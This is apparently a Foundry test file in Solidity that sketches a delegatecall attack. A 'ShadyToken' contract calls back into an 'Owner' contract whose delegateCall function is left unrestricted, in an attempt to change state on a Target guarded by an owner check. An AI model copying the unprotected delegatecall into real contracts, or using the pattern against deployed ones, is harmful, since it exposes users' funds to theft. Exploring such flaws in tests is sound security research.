// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

// if an owner calls a shady token then it can delegatecall a different ctrct owned by that Owner
// and do stuff
contract Target {
    address public immutable owner;
    uint public z;

    constructor(address owner_) {
        owner = owner_;
    }

    function setVar(uint256 x) external {
        require(msg.sender == owner);
        z = x;
        console.log('hacked');
    }

}

contract Owner {

    address public target;

    function setTarget(address target_) public {
        target = target_;
    }


    function callSafe(ShadyToken ctrct) public {
        ctrct.safe(address(this));
    }

    function delegateCall(bytes memory data) public {
        console.log('target', target);
        console.log('data', uint(bytes32(data)));
        (bool s,) = target.delegatecall(data);
        s;
    }
}

contract ShadyToken {

    address public z = address(0x69);
    address public immutable target;

    constructor(address target_) {
        target = target_;
    }

    function safe(address owner) public {
        (bool ok_,) = owner.delegatecall(
            abi.encodeWithSignature("delegateCall(bytes)", 0x66)
        );
        ok_;
    }
}

contract Test29 is Test {
    Target public target;
    ShadyToken public shadyToken;
    Owner public ownerCtrct;

    address hacker = address(0xB0FFEDC0DEBABE);

    function setUp() public {
        ownerCtrct = new Owner();
        target = new Target(address(ownerCtrct));
        ownerCtrct.setTarget(address(target));
        shadyToken = new ShadyToken(address(target));

    }

    function test_reenter_ouch() external {
        ownerCtrct.callSafe(shadyToken);
        console.log('shadyToken', shadyToken.z());
        console.log('target', target.z());
    }
}
